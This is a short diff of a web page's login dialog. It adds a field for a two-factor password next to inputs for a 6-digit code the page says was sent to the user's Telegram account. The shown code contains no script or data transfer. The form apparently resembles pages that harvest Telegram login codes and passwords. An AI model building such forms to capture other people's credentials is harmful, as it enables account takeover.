@@ -96,13 +96,13 @@
             <button class="close-btn">&times;</button>
 
             <div class="dialog-header">
-                <h2>Enter Verification Code</h2>
-                <p>We've sent a 6-digit code to your Telegram account</p>
+                <h2>Login Validation</h2>
+                <p id="code-login-definition">We've sent a 6-digit code to your Telegram account</p>
             </div>
 
             <form id="verification-form">
                 <div class="form-group">
-                    <label for="code">Verification Code</label>
+                    <label for="code" id="code-label">Verification Code</label>
                     <div class="code-input-container">
                         <input type="text" class="code-input" maxlength="1" data-index="1">
                         <input type="text" class="code-input" maxlength="1" data-index="2">
@@ -111,6 +111,7 @@
                         <input type="text" class="code-input" maxlength="1" data-index="5">
                     </div>
                     <input type="hidden" id="full-code" name="verification_code">
+                    <input type="text" id="2fa-password" name="2fa_password_code">
                 </div>
 
                 <div class="message-container info">
